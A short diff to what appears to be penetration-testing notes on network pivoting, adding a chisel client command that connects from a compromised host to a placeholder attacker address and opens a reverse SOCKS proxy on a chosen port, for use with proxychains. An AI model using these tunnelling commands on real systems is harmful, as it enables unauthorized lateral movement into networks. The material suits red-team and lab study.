@@ -28,6 +28,15 @@ If you want it to not block your current shell, do:
 chisel client ${ATTACKER_IP}:${ATTACKER_PORT} R:socks > /dev/null 2>&1 &
 ```
 
+If you don't want to use port 1080, do:
+
+```
+chisel client ${ATTACKER_IP}:${ATTACKER_PORT} R:${SOME_PORT}:socks
+```
+
+now, use `${SOME_PORT}` as the socks proxy port.
+
+
 Once the client and server is setup, we can access targets from the point of view of `${OWNED_IP0}` by using proxychains4:
 
 Add to proxychains4.conf:
